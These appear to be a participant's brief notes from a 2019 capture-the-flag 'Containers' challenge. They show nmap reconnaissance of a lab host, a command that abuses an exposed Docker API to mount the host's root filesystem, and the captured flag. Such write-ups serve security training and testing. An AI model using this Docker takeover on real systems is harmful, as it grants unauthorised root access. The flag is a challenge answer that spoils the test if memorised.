# Containers

Please assess the security of our new web app. The staging environment for our new app is on: 10.0.111.[100 + your_team_number] 

---------------------

nmap -sV --script=http-php-version -Pn 10.0.106.6 --dns-servers 192.168.100.1

[localhost tmctf2019-finals]$ nmap -p- -Pn 10.0.111.106 --dns-servers 192.168.100.1
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 18:18 PST
Nmap scan report for 10.0.111.106
Host is up (0.00076s latency).
Not shown: 65532 filtered ports
PORT     STATE  SERVICE
113/tcp  closed ident
8000/tcp open   http-alt
8080/tcp open   http-proxy

Nmap done: 1 IP address (1 host up) scanned in 119.35 seconds

------------------------------

(env-py2) [localhost tmctf2019-finals]$ nmap -sV -sC -Pn 10.0.111.106 --dns-servers 192.168.6.1                         
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-23 21:57 PST
Nmap scan report for 10.0.111.106
Host is up (0.00054s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE    VERSION
113/tcp  closed ident
8000/tcp open   http       Ajenti http control panel
|_http-title: Quality containers - Homepage
8080/tcp open   http-proxy Docker/19.03.4 (linux)
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: application/json
|     Date: Sun, 24 Nov 2019 05:57:42 GMT
|     Content-Length: 29
|     {"message":"page not found"}
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Api-Version: 1.40
|     Docker-Experimental: false
|     Ostype: linux
|     Server: Docker/19.03.4 (linux)
|     Date: Sun, 24 Nov 2019 05:57:42 GMT
|_    Content-Length: 0
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Docker/19.03.4 (linux)
|_http-title: Site doesn't have a title (application/json).


-------

DOCKER_HOST=tcp://10.0.111.106:8080 docker run -it -v /:/app ubuntu:latest

--------

/home/ctf/container-bridge/populate.py:    flag = 'TMCTF{muggedby2candies!}'
